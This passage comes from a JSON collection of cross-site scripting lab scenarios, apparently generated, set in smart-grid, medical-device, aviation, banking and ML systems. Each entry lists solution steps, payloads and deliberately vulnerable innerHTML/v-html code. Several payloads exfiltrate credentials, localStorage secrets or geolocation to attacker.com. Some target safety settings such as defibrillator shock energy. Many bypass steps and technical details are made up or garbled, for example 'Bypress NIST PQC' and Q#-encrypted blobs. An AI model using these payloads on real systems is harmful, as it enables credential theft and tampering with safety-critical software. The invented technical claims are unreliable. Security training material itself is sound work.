      "Use Postman to send malicious OBIS code: 1.0.31.7.0.255<script>alert('DEMAND_RESPONSE')</script>",
      "Bypass IEC 62056-21 checksum validation using null-byte padding",
      "Exploit firmware signature verification race condition",
      "Trigger through automated DR (Demand Response) events"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"manufacturer\":\"SolarWatt\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\"}",
      "<meter id='x' onmouseover='alert(1)'></meter>"
    ],
    "srcCode": "app.post('/firmware', async (req, res) => {\n  await db.query('INSERT INTO meters (data) VALUES ($1)', [req.body]);\n});\n// Client:\n<template v-html=\"meterInfo\"></template>"
  },
  {
    "Lab scenario": "Mutation XSS in SCADA Alarm Log Visualization",
    "Lab Description": "A generation plant's HMI parses DNP3 protocol alarm messages into HTML tables. The application's XML-to-DOM converter fails to handle namespaces in SVG-based alerts. To solve: Craft malicious DNP3 object headers that mutate into scripts during refresh cycles.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use opendnp3 to forge ObjectHeader: 0x3C 0x73 0x63 0x72 (hex for <scr)",
      "Complete payload: <![CDATA[</td><animate attributeName='href' values='javascript:alert(1)'/>]]>",
      "Bypass DNP3 CRC validation using fragmented packets",
      "Trigger through frequency excursion alarms"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<xml:namespace prefix=\"svg\"/><svg:script>alert('GRID_PWN')</svg:script>",
      "<event xmlns:html='http://www.w3.org/1999/xhtml'><html:script>alert(1)"
    ],
    "srcCode": "app.post('/alarms', (req, res) => {\n  const parser = new xml2js.Parser();\n  parser.parseString(req.body, (err, result) => {\n    res.send(`<table>${result.alarms.map(a => `<tr>${a}</tr>`)}</table>`);\n  });\n});"
  },
  {
    "Lab scenario": "Stored XSS in Renewable Energy Forecasting API",
    "Lab Description": "A wind farm prediction system stores JSONP callback functions in Cassandra without validation. The application's admin panel dynamically creates script tags from stored entries. To solve: Inject XSS through malicious weather data callback that executes when meteorologists view forecasts.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Craft API request: /api/forecast?callback=alert(document.cookie)",
      "Bypass CORS using JSONP wrapping: /**/ typeof __xss__ === 'function' && __xss__({\"data\":...})",
      "Exploit Protobuf deserialization order mismatch",
      "Trigger through solar irradiance prediction widgets"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "?callback=(()=>{window.location='https://attacker.com?exfil='+btoa(localStorage.credentials)})",
      "?callback=coffeeScript.compile(`alert 'XSS'`)"
    ],
    "srcCode": "app.get('/forecast', (req, res) => {\n  res.setHeader('Content-Type', 'application/javascript');\n  res.send(`${req.query.callback}(${forecastData})`);\n});"
  },
  {
    "Lab scenario": "DOM XSS in AMI (Advanced Metering Infrastructure) Headend",
    "Lab Description": "A smart meter data collection system renders meter IDs from C12.22 protocol messages in Angular templates without sanitization. The application uses bypassSecurityTrustHtml for real-time usage displays. To solve: Spoof C12.22 ReadData responses containing XSS payloads.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Use AMISim to generate malicious table data: <div [innerHTML]=\"userContent\">",
      "Bypass C12.19 table validation using manufacturer-specific extensions",
      "Exploit Angular template injection via {{constructor.constructor('alert(1)')()}}",
      "Trigger through TOU (Time-of-Use) pricing updates"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"meterId\":\"{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}\"}",
      "<div ng-app> {{ 'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//'); }} "
    ],
    "srcCode": "this.sanitizer.bypassSecurityTrustHtml(`<div>${meterData}</div>`);\n// Template:\n<div [innerHTML]=\"trustedHtml\"></div>"
  },
  {
    "Lab scenario": "Stored XSS in Implantable Cardioverter-Defibrillator (ICD) Remote Monitoring",
    "Lab Description": "A cardiac device management portal stores episode electrograms in MongoDB without input sanitization. The application's React frontend renders intracardiac signals using dangerouslySetInnerHTML. To solve: Inject XSS through spoofed ventricular tachycardia episodes that execute when cardiologists review arrhythmia logs.",
    "Difficulty Level": "Critical",
    "Solution Steps": [
      "Use Medtronic CareLink simulator to send malicious episode data",
      "Craft payload: EGM_Label=\"<svg/onload='fetch(`/api/icd-config?shock_energy=0`))'>\"",
      "Bypass HL7 aECG schema validation using header injection",
      "Trigger through remote device interrogation"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"episode\":\"<script>document.write('<iframe src=attacker.com></iframe>')</script>\"}",
      "<img src='x' onerror='navigator.bluetooth.requestDevice({filters:[{services:[0x180d]}]'>"
    ],
    "srcCode": "app.post('/episodes', (req, res) => {\n  ICDModel.updateOne({ patientId }, { $push: { episodes: req.body } });\n});\n// Client:\n<div dangerouslySetInnerHTML={{ __html: episodeData }} />"
  },
  {
    "Lab scenario": "DOM XSS in MRI Quench Detection System",
    "Lab Description": "A superconducting magnet monitoring dashboard reflects cryogen levels from URL parameters in D3.js visualizations. The application uses innerHTML for emergency quench alerts. To solve: Inject XSS through crafted helium level parameter that triggers during magnet ramp-down sequences.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Intercept quench alert request with OWASP ZAP",
      "Modify level=78.3%3Cscript%3Ealert('QUENCH_OVERRIDE')%3C/script%3E",
      "Bypass CSP using SVG foreignObject injection",
      "Trigger through automated safety system tests"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "https://mri.example.com?helium=<svg/onload='document.body.innerHTML+=`<img src=http://attacker.com?${btoa(localStorage.creds)}>`>",
      "<math><maction actiontype='statusline#http://attacker.com'></maction>"
    ],
    "srcCode": "const params = new URLSearchParams(location.search);\ndocument.getElementById('cryo-level').innerHTML = params.get('helium');"
  },
  {
    "Lab scenario": "Mutation XSS in Smart Insulin Pump Configuration Portal",
    "Lab Description": "A diabetes management system parses basal rate schedules from XML without proper namespace handling. The application's Angular template renders therapy plans using bypassSecurityTrustHtml. To solve: Inject XSS through malicious basal rate entries that execute during bolus calculator usage.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OmniPod PDM emulator to submit schedule: <xhtml:script>alert(1)",
      "Bypass XML schema validation using ambiguous namespace prefixes",
      "Exploit AngularJS ng-bind-html directive sanitizer bypass",
      "Trigger through temporary basal rate activations"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<basalrates xmlns:html='http://www.w3.org/1999/xhtml'><html:script>alert(1)</html:script>",
      "<!--<script>alert('INSULIN_OVERDOSE')</script>-->"
    ],
    "srcCode": "this.sanitizer.bypassSecurityTrustHtml(`<div>${basalSchedule}</div>`);\n// Template:\n<div [innerHTML]=\"trustedHtml\"></div>"
  },
  {
    "Lab scenario": "Stored XSS in DICOM Radiation Therapy Planning System",
    "Lab Description": "An oncology treatment platform stores RTSTRUCT DICOM files with unescaped ROI names. The application renders structure sets in Three.js using innerHTML for tooltips. To solve: Inject XSS through malicious ROI annotations that execute during dose-volume histogram analysis.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Use pydicom to modify (3006,0026) ROI Name: \"<img src=x onerror=alert('DOSE_SABOTAGE')>\",",
      "Bypass DICOM VR (LO) 64-char limit using continuation sequences",
      "Exploit WebGL shader error message concatenation",
      "Trigger through plan comparison workflows"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "(3006,0026) LO = \"\\u0000<script>alert(1)</script>\"",
      "<g onbegin=\"alert(1)\"><animate attributeName=\"x\" dur=\"1s\"/></g>"
    ],
    "srcCode": "app.get('/rtstruct', (req, res) => {\n  const ds = dcmjs.data.DicomMessage.readFile(req.file.path);\n  res.render('viewer', { rois: ds.ROIContourSequence });\n});"
  },
  {
    "Lab scenario": "DOM XSS in Patient-Controlled Analgesia (PCA) Pump Log Viewer",
    "Lab Description": "A pain management system reflects unsanitized drug names from URL parameters in its Vue interface. The application uses v-html for medication history timelines. To solve: Inject XSS through crafted drug parameter that triggers when nurses review administration records.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept medication search with Burp Suite",
      "Modify drug=Fentanyl%3Cscript%3Ealert('PCA_OVERRIDE')%3C/script%3E",
      "Bypass Vue sanitization using prototype pollution",
      "Trigger through shift change report generation"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "?drug=__proto__[innerHTML]=<script>alert(1)</script>",
      "<div v-html=\"userInput\"></div>"
    ],
    "srcCode": "new Vue({\n  el: '#app',\n  data: { drug: new URLSearchParams(location.search).get('drug') },\n  template: `<div v-html=\"drug\"></div>`\n});"
  },
  {
    "Lab scenario": "DOM XSS in FADEC Ground Station Telemetry Dashboard",
    "Lab Description": "A jet engine monitoring system reflects unsanitized EGT (Exhaust Gas Temperature) values from WebSocket streams. The application uses innerHTML for real-time parameter alerts. To solve: Inject XSS through spoofed CAN bus messages that execute when engineers view overspeed warnings.",
    "Difficulty Level": "Critical",
    "Solution Steps": [
      "Use ARINC 664 simulator to craft malicious parameter: EGT= <svg/onload='fetch(\"/api/engine-control?thrust=120%\")'>",
      "Bypass ARINC 429 label validation using bus snooping",
      "Exploit Three.js CSS2DRenderer text handling",
      "Trigger through engine stall test mode"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"n1\":\"95%3Cscript%3Ealert('FADEC_OVERRIDE')%3C/script%3E\"}",
      "<math><maction actiontype='statusline#xss'>alert(1)</maction>"
    ],
    "srcCode": "const ws = new WebSocket('ws://fadec:9090');\nws.onmessage = e => {\n  document.getElementById('egt-display').innerHTML = \n    `<span>${JSON.parse(e.data).egt}</span>`;\n};"
  },
  {
    "Lab scenario": "Stored XSS in ADS-B Aircraft Tracking System",
    "Lab Description": "An air traffic control platform stores aircraft registration data in PostgreSQL without input validation. The Vue frontend renders ICAO 24-bit addresses using v-html. To solve: Spoof Mode-S transponder messages containing XSS that triggers when controllers click aircraft icons.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Use dump1090 to broadcast malicious registration: A7-FUZZ<script>alert('TCAS_PWN')</script>",
      "Bypass ICAO Annex 10 checks using squawk code injection",
      "Exploit OpenLayers popup sanitization bypass",
      "Trigger through conflict alert resolution advisories"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"flight\":\"AA123\",\"hex\":\"<img src=x onerror='navigator.geolocation.getCurrentPosition(e=>fetch(`http://attacker.com?pos=${e.coords}`))'>\"}",
      "%%x%%3Cscript%%x%%3Ealert(1)%%x%%3C/script%%x%%3E"
    ],
    "srcCode": "app.post('/adsb', async (req, res) => {\n  await db.query('INSERT INTO flights VALUES ($1)', [req.body.hex]);\n});\n// Client:\n<div v-html=\"flight.hex\"></div>"
  },
  {
    "Lab scenario": "Mutation XSS in Satellite Telecommand Interface",
    "Lab Description": "A spacecraft command system parses CCSDS telecommand packets into XML without proper namespace isolation. The application's Electron-based UI uses dangerouslySetInnerHTML for command histories. To solve: Inject XSS through malicious TC packets that execute during solar array deployment sequences.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Use SatNOGS to transmit packet: <COMMAND NAME=\"<script>alert('ATTITUDE_CHANGE')</script>\"",
      "Bypass COP-1 protocol validation using bypass lock",
      "Exploit XSLT stylesheet injection in telemetry displays",
      "Trigger through momentum wheel desaturation events"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<![CDATA[</sp/><script>alert(1)</script>]]>",
      "<xml:namespace prefix=\"html\"/><html:script>alert(1)"
    ],
    "srcCode": "const parser = new CCSDS.PacketParser();\nparser.on('packet', pkt => {\n  mainWindow.webContents.send('command', pkt.data);\n});\n// Renderer:\ndocument.getElementById('history').innerHTML += cmd;"
  },
  {
    "Lab scenario": "DOM XSS in Aviation Maintenance EHR Integration",
    "Lab Description": "An aircraft health management system reflects unsanitized part numbers from URL parameters in its AngularJS interface. The application uses $sce.trustAsHtml for maintenance log rendering. To solve: Inject XSS through crafted MSG-3 task codes that execute when technicians view component histories.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept parts lookup request with Burp Suite",
      "Modify pn=MSN456%3Cscript%3Ealert('EHR_PHI_LEAK')%3C/script%3E",
      "Bypass AngularJS sandbox using charAt override",
      "Trigger through airworthiness directive compliance checks"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}",
      "<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}} "
    ],
    "srcCode": "app.controller('MainCtrl', function($scope, $sce) {\n  $scope.partNumber = $sce.trustAsHtml($routeParams.pn);\n});\n<!-- Template -->\n<div ng-bind-html=\"partNumber\"></div>"
  },
  {
    "Lab scenario": "Stored XSS in Flight Planning API Gateway",
    "Lab Description": "An EFB (Electronic Flight Bag) system stores flight plans in Redis without input validation. The React frontend renders ICAO flight plan fields using dangerouslySetInnerHTML. To solve: Inject XSS through malicious route remarks that execute when pilots file revised plans.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send FIR/ route: -SCRIPT<script>alert('FLIGHT_REROUTE')</script>",
      "Bypass EUROCONTROL AFTN message validation via SID/STAR injection",
      "Exploit NOTAM text-to-speech conversion flaws",
      "Trigger through collaborative flight planning"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"route\":\"KLAX..<svg/onload='console.log(\\\"JEPPESEN_DATA\\\")'>..RJAA\"}",
      "RMK/ <img src=x onerror='new AudioContext().createScriptProcessor(4096,1,1)'>"
    ],
    "srcCode": "app.post('/flightplan', (req, res) => {\n  redisClient.set(req.body.id, JSON.stringify(req.body));\n});\n// Client:\n<div dangerouslySetInnerHTML={{ __html: plan.remarks }} />"
  },
  {
    "Lab scenario": "DOM XSS in Metaverse Avatar Profile Rendering",
    "Lab Description": "A WebXR social platform renders 3D avatar bios using Babylon.js without sanitizing NFT metadata. The application converts on-chain ERC-6551 tokens to HTML panels using innerHTML. To solve: Inject XSS through malicious tokenURI that executes when users inspect virtual goods.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Mint NFT with description: <x3d><script>alert('VR_SESSION')</script>",
      "Bypass IPFS CID validation using base36 polyglots",
      "Exploit WebGL shader error handling",
      "Trigger through avatar inventory sharing"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "data:application/x3d+xml,<Script><![CDATA[alert(document.cookie)]]></Script>",
      "<model><body onload='javascript:alert(1)'/>"
    ],
    "srcCode": "async loadAvatar(tokenId) {\n  const metadata = await ERC6551.getMetadata(tokenId);\n  document.getElementById('bio').innerHTML = metadata.description;\n}"
  },
  {
    "Lab scenario": "Stored XSS in Quantum-Secure Voting System",
    "Lab Description": "A post-quantum e-voting platform stores ballot comments in Q#-encrypted blobs without input validation. The React frontend decrypts and renders using dangerouslySetInnerHTML. To solve: Inject XSS through lattice-based ciphertext that persists through homomorphic tallying.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Use MLWE ciphertext manipulator to encode payload",
      "Craft comment: \\u003Cscript\\u003Ealert('ELECTION_PWN')\\u003C/script\\u003E",
      "Bypress NIST PQC standardization checks using FrodoKEM parameter confusion",
      "Trigger through result audit processes"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "CRYSTALS-KYBER-768:<svg/onload='fetch(\"/api/ballots?decrypt=true\")'>",
      "SIKEp503_COMPRESSED<script>alert(1)</script>"
    ],
    "srcCode": "const plaintext = qsharp.decrypt(ciphertext, privateKey);\ndocument.getElementById('comment').innerHTML = plaintext;"
  },
  {
    "Lab scenario": "Mutation XSS in Vertical Farm IoT Dashboard",
    "Lab Description": "A hydroponic control system parses Modbus sensor data into SVG growth charts. The application's Angular template bypasses sanitization for real-time EC/pH displays. To solve: Inject XSS through nutrient dosing parameters that execute during automated flush cycles.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use PLCsim to spoof sensor: EC=5.8<animate attributeName='href' values='javascript:alert(1)'/>",
      "Bypass ISA-88 batch validation using phase injection",
      "Exploit D3.js transition.on('end') handlers",
      "Trigger through CO2 enrichment system alerts"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<set attributeName='onclick' to='alert(\"NUTRIENT_OVERRIDE\")'/>",
      "pH:7.2<foreignObject><script>document.write('<iframe src=attacker.com>')"
    ],
    "srcCode": "this.sanitizer.bypassSecurityTrustHtml(`<svg>${sensorData}</svg>`);\n// Template:\n<div [innerHTML]=\"trustedSVG\"></div>"
  },
  {
    "Lab scenario": "DOM XSS in Space Tourism Booking Portal",
    "Lab Description": "A lunar travel agency's payment system reflects unsanitized promo codes from URL parameters. The Vue/Nuxt frontend uses v-html for limited-time offer banners. To solve: Inject XSS through crafted discount code that executes during launch window selection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept checkout request with Burp Suite",
      "Modify promo=MOON25%3Cscript%3Ealert('BOOKING_PWN')%3C/script%3E",
      "Bypass CSP using WebAssembly.instantiate streaming",
      "Trigger through seat map rendering"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "?promo=SPACE2024<svg/onload='navigator.credentials.get({otp:true})'>",
      "<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}} "
    ],
    "srcCode": "export default {\n  asyncData({ query }) {\n    return { promo: query.discount }\n  },\n  template: `<div v-html=\"promo\"></div>`\n}"
  },
  {
    "Lab scenario": "Stored XSS in DAO Governance Proposal Renderer",
    "Lab Description": "A decentralized autonomous organization stores Snapshot proposals in IPFS without sanitization. The Svelte frontend renders Markdown with mdsvex using raw HTML enabled. To solve: Inject XSS through proposal body that executes when delegates vote on-chain.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Craft proposal: [XSS](javascript&#58;alert('TREASURY_DRAIN'))",
      "Bypass IPFS CID filtering using unified diff patches",
      "Exploit ENS reverse resolution in delegate displays",
      "Trigger through vote delegation smart contract calls"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "```html\n<template shadowroot><script>alert(1)</script>",
      "---\ntitle: Proposal\n---\n<script>window.ethereum.send('eth_sendTransaction', ...)</script>"
    ],
    "srcCode": "const html = compileMarkdown(ipfsContent);\ndocument.getElementById('proposal').innerHTML = html;"
  },
  {
    "Lab scenario": "DOM XSS in Quantum Key Distribution Dashboard",
    "Lab Description": "A QKD network monitor reflects URL parameters in Three.js WebGL visualizations without sanitization. The application converts BB84 protocol error rates to SVG tooltips using innerHTML. To solve: Inject XSS through crafted photon detector efficiency parameters that execute during key rate calculations.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept parameter request with Burp Suite",
      "Craft payload: efficiency=0.45<svg/onload='fetch(\"/api/keys?delete=true\")'>",
      "Bypass CSP using WebAssembly.instantiateStreaming polyglot",
      "Trigger through automated privacy amplification cycles"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "?efficiency=<!--<script>alert('QBER_OVERRIDE')</script>-->",
      "<math><maction actiontype='statusline#xss'>alert(1)</maction>"
    ],
    "srcCode": "app.get('/qkd', (req, res) => {\n  res.render('dashboard', { efficiency: req.query.efficiency });\n});\n// Client:\ndocument.getElementById('photon-display').innerHTML = efficiencyValue;"
  },
  {
    "Lab scenario": "Stored XSS in Lattice-Based Signature Registry",
    "Lab Description": "A PQC migration platform stores Dilithium public keys in Cassandra with disabled input validation. The React frontend renders user comments using dangerouslySetInnerHTML. To solve: Inject XSS through crafted key metadata that persists through NIST standardization audits.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OpenSSL-NTru to generate malicious key: comment=<script>alert('SIG_FORGERY')</script>",
      "Bypass ML-KEM schema validation using truncated polynomials",
      "Exploit React hydration mismatch in key comparison views",
      "Trigger through CRYSTALS-Dilithium reference implementation tests"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"metadata\":\"Dilithium2\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\"}",
      "-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----<img src=x onerror=alert(1)>"
    ],
    "srcCode": "app.post('/keys', (req, res) => {\n  cassandraClient.execute('INSERT INTO pqc (data) VALUES (?)', [req.body]);\n});\n// Client:\n<div dangerouslySetInnerHTML={{ __html: keyData }} />"
  },
  {
    "Lab scenario": "Mutation XSS in Quantum Annealing Result Visualization",
    "Lab Description": "A quantum optimization service parses D-Wave solver outputs into D3.js force graphs. The application's XML-to-SVG converter fails to handle QUBO model namespaces. To solve: Craft malicious Ising model parameters that mutate into scripts during energy landscape rendering.",
    "Difficulty Level": "Critical",
    "Solution Steps": [
      "Modify qubo.xml: <variable name=\"</text><script>alert(1)</script>\">",
      "Bypass BQM validation using Chimera graph embedding",
      "Exploit D3.js drag behavior event handlers",
      "Trigger through reverse quantum annealing simulations"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<xml:namespace prefix=\"html\"/><html:script>alert('QPU_ACCESS')",
      "{\"h\":{\"0\":\"<svg/onload='console.log(parent.energy)'/>\"}}"
    ],
    "srcCode": "const parser = new DOMParser();\nconst doc = parser.parseFromString(qpuOutput, 'text/xml');\nd3.select('#graph').html(doc.documentElement.outerHTML);"
  },
  {
    "Lab scenario": "DOM XSS in Quantum Error Correction Dashboard",
    "Lab Description": "A fault-tolerant quantum computing interface reflects surface code decoder parameters in Angular templates. The application bypasses sanitization for real-time error rate displays. To solve: Inject XSS through crafted stabilizer measurement rounds that execute during logical qubit initialization.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept surface code API request with OWASP ZAP",
      "Craft payload: rounds=100<script>alert('LOGICAL_QUBIT')</script>",
      "Bypass Angular template sanitizer using [innerHTML] binding",
      "Trigger through lattice surgery animations"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}",
      "<div [innerHTML]=\"userInput\"></div>"
    ],
    "srcCode": "this.sanitizer.bypassSecurityTrustHtml(`<div>${decoderParams}</div>`);\n// Template:\n<div [innerHTML]=\"trustedHtml\"></div>"
  },
  {
    "Lab scenario": "Stored XSS in Quantum Neural Network Training Logs",
    "Lab Description": "A hybrid quantum-classical ML platform stores TensorBoard logs in MinIO without validation. The Vue frontend renders hyperparameter tables using v-html. To solve: Inject XSS through malicious circuit depth entries that execute during gradient visualization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Modify params.json: {\"layers\": \"<img src=x onerror='alert(`VQC_PWN`)'>\"}",
      "Bypass PennyLane schema validation using parametric gates",
      "Exploit tfjs-vis surface texture rendering flaws",
      "Trigger through quantum kernel alignment workflows"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"ansatz\":\"</textarea><script>alert(1)</script>\"}",
      "<iframe srcdoc='<script>parent.alert(1)</script>'></iframe>"
    ],
    "srcCode": "app.post('/experiment', (req, res) => {\n  minioClient.putObject('logs', req.body);\n});\n// Client:\n<div v-html=\"hyperparams\"></div>"
  },
  {
    "Lab scenario": "DOM XSS in Model Zoo Metadata Renderer",
    "Lab Description": "A popular ML framework's model registry reflects search parameters in TensorFlow.js visualization tools. The application converts ONNX model metadata to HTML using innerHTML. To solve: Inject XSS through crafted operator type names that execute during model comparison.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept model search request with Burp Suite",
      "Craft payload: op_type=Conv<script>alert('MODEL_EXFIL')</script>",
      "Bypass CSP using WebGL texture source injection",
      "Trigger through automated model quantization workflows"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "?op=<!--<script>fetch('/models?q='+document.cookie)</script>-->",
      "<svg><foreignObject><script>parent.alert(1)</script>"
    ],
    "srcCode": "app.get('/model', (req, res) => {\n  res.render('details', { opType: req.query.op_type });\n});\n// Client:\ndocument.getElementById('ops').innerHTML = opType;"
  },
  {
    "Lab scenario": "Stored XSS in Federated Learning Client",
    "Lab Description": "A healthcare FL platform stores client updates in IPFS without input sanitization. The React dashboard renders participant metadata using dangerouslySetInnerHTML. To solve: Inject XSS through malicious gradient updates that execute during global model aggregation.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Modify params.json: {\"client_id\":\"<img src=x onerror='alert(`PATIENT_LEAK`)'>\"}",
      "Bypass homomorphic encryption wrapper using parameter slicing",
      "Exploit PyTorch model diffs visualization",
      "Trigger through differential privacy audits"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"metadata\":\"HospitalA\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\"}",
      "<iframe srcdoc='<script>parent.postMessage(localStorage.phi,\"*\")</script>'></iframe>"
    ],
    "srcCode": "app.post('/update', (req, res) => {\n  ipfs.add(Buffer.from(JSON.stringify(req.body)));\n});\n// Client:\n<div dangerouslySetInnerHTML={{ __html: clientID }} />"
  },
  {
    "Lab scenario": "Mutation XSS in MLOps Pipeline Templates",
    "Lab Description": "A CI/CD platform for ML parses Kubeflow pipeline YAML into HTML documentation. The application's Markdown renderer allows raw HTML in template descriptions. To solve: Craft malicious component description that bypasses Argo Workflows sanitization.",
    "Difficulty Level": "Critical",
    "Solution Steps": [
      "Inject payload: description: \"<xmp><plaintext><img src=x onerror=alert(1)>\"",
      "Bypass YAML schema validation using multi-line literals",
      "Exploit Tekton dashboard annotation rendering",
      "Trigger through pipeline visualization generation"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "|2\n  <script>alert('PIPELINE_PWN')</script>\n",
      "description: >\n  ]></textarea><script>alert(1)</script>"
    ],
    "srcCode": "function generateDocs(yaml) {\n  const html = marked.parse(yaml);\n  return html.replace(/</?script>/gi, ''); // Inadequate filter\n}"
  },
  {
    "Lab scenario": "DOM XSS in Synthetic Training Data Generator",
    "Lab Description": "A GAN-based data augmentation tool reflects user inputs in D3.js visualizations. The application uses Angular's bypassSecurityTrustHtml for synthetic sample metadata. To solve: Inject XSS through crafted feature distribution parameters.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Modify params.json: {\"dist\": \"normal<svg/onload='fetch(`/api/data?exfil=${btoa(model)})'>\"}",
      "Bypass TFRecord schema validation using proto field wrapping",
      "Exploit tfjs-vis surface texture rendering",
      "Trigger through latent space interpolation"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"mean\":\"0.5\",\"std\":\"</script><svg/onload=alert(1)>\"}",
      "<div ng-controller=\"MainCtrl\">{{constructor.constructor('alert(1)')()}}"
    ],
    "srcCode": "this.sanitizer.bypassSecurityTrustHtml(`<div>${distParams}</div>`);\n// Template:\n<div [innerHTML]=\"trustedHtml\"></div>"
  },
  {
    "Lab scenario": "Stored XSS in LLM Fine-Tuning Interface",
    "Lab Description": "A ChatGPT plugin stores training conversations in Elasticsearch without escaping. The Vue frontend renders system prompts using v-html. To solve: Inject XSS through crafted instruction examples that execute during RLHF alignment.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Use Postman to send payload: {\"prompt\":\"<script>alert('PROMPT_INJECTION')</script>\"}",
      "Bypass OpenAI moderation API using homoglyphic characters",
      "Exploit WebSocket message fragmentation",
      "Trigger through reward model scoring"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"text\":\"Translate this: \\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\"}",
      "<img alt='<xmp><plaintext><img src=x onerror=alert(1)>"
    ],
    "srcCode": "app.post('/prompts', (req, res) => {\n  elasticClient.index({ body: req.body });\n});\n// Client:\n<div v-html=\"promptText\"></div>"
  },
  {
    "Lab scenario": "DOM XSS in Digital Wallet QR Generator",
    "Lab Description": "A neobank's payment portal reflects URL parameters in SVG-based QR codes without sanitization. The application embeds user-controlled data in <desc> tags visible to screen readers. To solve: Inject XSS through crafted recipient addresses that execute during QR scanning simulation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept QR generation with Burp Suite",
      "Craft payload: recipient=</desc><script>alert('WALLET_DRAIN')</script>",
      "Bypass SVG schema validation using namespace confusion",
      "Trigger through accessibility mode preview"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "payto://iban/DE75512108001245126199?message=<svg/onload=alert(1)>",
      "<![CDATA[</text><script>alert(document.cookie)</script>]]>"
    ],
    "srcCode": "app.get('/qr', (req, res) => {\n  res.send(`<svg><desc>${req.query.recipient}</desc></svg>`);\n});"
  },
  {
    "Lab scenario": "Stored XSS in Transaction Memo Field (SWIFT MT940)",
    "Lab Description": "A corporate banking platform parses SWIFT messages without sanitizing :86: remark fields. The Angular frontend renders transaction lists using [innerHTML]. To solve: Inject XSS through crafted payment remarks that persist through SEPA clearing.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Use FinTS simulator to send payload: :86:/<script>fetch('/api/transactions?delete=true')",
      "Bypass SWIFT character set validation using UTF-7 encoding",
      "Exploit Angular template injection via constructor.constructor",
      "Trigger through monthly statement generation"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      ":86:/+ADw-script+AD4-alert(1)+ADw-/script+AD4-",
      "{\"remarks\":\"\\u003Cscript\\u003Ealert('CORPORATE_ACCOUNT')\\u003C/script\\u003E\"}"
    ],
    "srcCode": "this.sanitizer.bypassSecurityTrustHtml(`<div>${swiftData}</div>`);"
  },
  {
    "Lab scenario": "Mutation XSS in Chat Message Formatting Engine",
    "Lab Description": "A military-grade secure chat app converts Markdown to HTML using outdated parser. The application's emoji shortcode processor fails to handle nested contexts. To solve: Craft message that bypasses :emoji: syntax to execute script during message threading.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Send message: :warning:`'><svg/onload='alert(\"TS_LEAK\")'>",
      "2. Bypass DOMPurify using SVG event handler obfuscation",
